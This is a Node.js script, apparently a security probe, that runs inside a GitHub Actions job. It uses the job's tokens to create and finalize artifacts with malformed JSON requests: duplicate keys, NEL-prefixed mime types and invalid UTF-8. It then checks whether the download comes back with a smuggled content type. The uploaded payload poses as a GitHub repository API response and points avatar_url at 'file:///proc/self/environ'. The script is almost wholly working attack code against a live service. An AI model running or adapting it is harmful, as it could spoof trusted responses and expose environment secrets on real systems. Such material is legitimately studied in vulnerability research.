import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const client=internalArtifactTwirpClient({maxAttempts:1});
const good='application/json';
const nel='\u0085application/json';
const sha=b=>createHash('sha256').update(b).digest('hex');
const q=JSON.stringify;
function request(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const transport=target.protocol==='https:'?https:http;
    const req=transport.request(target,{method,headers,timeout:15000},res=>{
      const chunks=[];res.on('data',x=>chunks.push(x));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(chunks)}));
    });
    req.on('error',reject);req.on('timeout',()=>req.destroy(new Error('timeout')));
    if(body)req.write(body);req.end();
  });
}
async function upload(url,body){
  const r=await request(url,'PUT',body,{
    'x-ms-version':'2025-01-05','x-ms-blob-type':'BlockBlob',
    'x-ms-blob-content-type':'\u0085application/json',
    'Content-Type':'application/octet-stream','Content-Length':String(body.length),
  });
  if(r.status!==201)throw new Error(`Blob PUT ${r.status} ${r.headers['x-ms-error-code']||''}`);
}
const cases=[
  ['control-json',`"version":7,"mimeType":${q(good)}`],
  ['camel-good-nel',`"version":7,"mimeType":${q(good)},"mimeType":${q(nel)}`],
  ['camel-nel-good',`"version":7,"mimeType":${q(nel)},"mimeType":${q(good)}`],
  ['snake-good-nel',`"version":7,"mime_type":${q(good)},"mime_type":${q(nel)}`],
  ['snake-nel-good',`"version":7,"mime_type":${q(nel)},"mime_type":${q(good)}`],
  ['camel-good-snake-nel',`"version":7,"mimeType":${q(good)},"mime_type":${q(nel)}`],
  ['snake-nel-camel-good',`"version":7,"mime_type":${q(nel)},"mimeType":${q(good)}`],
  ['camel-nel-snake-good',`"version":7,"mimeType":${q(nel)},"mime_type":${q(good)}`],
  ['snake-good-camel-nel',`"version":7,"mime_type":${q(good)},"mimeType":${q(nel)}`],
  ['version-6-7-nel',`"version":6,"version":7,"mimeType":${q(nel)}`],
  ['version-7-6-nel',`"version":7,"version":6,"mimeType":${q(nel)}`],
  ['version-string7-nel',`"version":"7","mimeType":${q(nel)}`],
  ['version-float7-nel',`"version":7.0,"mimeType":${q(nel)}`],
  ['wrapper-value-nel',`"version":7,"mimeType":{"value":${q(nel)}}`],
  ['wrapper-good-nel',`"version":7,"mimeType":{"value":${q(good)},"value":${q(nel)}}`],
  ['wrapper-nel-good',`"version":7,"mimeType":{"value":${q(nel)},"value":${q(good)}}`],
  ['escaped-nel',`"version":7,"mimeType":"\\u0085application/json"`],
  ['unpaired-surrogate',`"version":7,"mimeType":"\\udc85application/json"`],
  ['raw-invalid-utf8','"version":7,"mimeType":"__RAW__application/json"'],
];

async function runCase(index,[label,fields]){
  const name=`repo-cassette-jsonmatrix-${runId}-${index}`;
  const report={label,name};
  try{
    const head=`{"workflowRunBackendId":${q(ids.workflowRunBackendId)},"workflowJobRunBackendId":${q(ids.workflowJobRunBackendId)},"name":${q(name)},${fields}}`;
    const body=label==='raw-invalid-utf8'
      ?Buffer.concat([Buffer.from(head.split('__RAW__')[0]),Buffer.from([0x85]),Buffer.from(head.split('__RAW__')[1])])
      :Buffer.from(head);
    const endpoint=new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',process.env.ACTIONS_RESULTS_URL);
    const created=await request(endpoint.href,'POST',body,{
      Authorization:`Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
      Accept:'application/json','Content-Type':'application/json','Content-Length':String(body.length),
    });
    report.createStatus=created.status;
    if(created.status!==200){report.createError=created.body.toString('utf8').slice(0,180).replace(/https?:\/\/[^\s"']+/g,'[url]');return}
    const response=JSON.parse(created.body.toString('utf8'));
    report.createOk=response.ok;
    const uploadUrl=response.signedUploadUrl||response.signed_upload_url;
    if(!response.ok||!uploadUrl)return;
    report.uploadBlob=new URL(uploadUrl).pathname.split('/').at(-1);
    const placeholder=Buffer.from('{}');
    await upload(uploadUrl,placeholder);
    const finalized=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    if(!finalized.ok)throw new Error('FinalizeArtifact ok=false');
    report.artifactId=String(finalized.artifactId);
    const repository=`${repo}/actions/artifacts/${report.artifactId}/zip`;
    const payload=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:label,stargazers_count:0}));
    await upload(uploadUrl,payload);report.expectedSha=sha(payload);
    for(let attempt=0;attempt<8;attempt++){
      const api=await request(`https://api.github.com/repos/${repository}`,'GET',null,{
        Authorization:`Bearer ${process.env.GITHUB_TOKEN}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-jsonmatrix',
      });
      report.restStatus=api.status;
      if(api.status===404){await new Promise(r=>setTimeout(r,300));continue}
      if(api.status!==302||!api.headers.location)break;
      const location=new URL(api.headers.location);
      report.rsct=location.searchParams.get('rsct');
      report.downloadBlob=location.pathname.split('/').at(-1);
      const final=await request(location.href);
      report.finalStatus=final.status;
      report.finalContentTypeHex=(final.headers['content-type']||'').split('').map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
      report.finalBodyMatch=final.body.equals(payload);
      break;
    }
  }catch(error){report.error=String(error.message||error).slice(0,180).replace(/https?:\/\/[^\s"']+/g,'[url]')}
  finally{console.log('JSON_MATRIX',JSON.stringify(report))}
}
for(let i=0;i<cases.length;i++)await runCase(i,cases[i]);
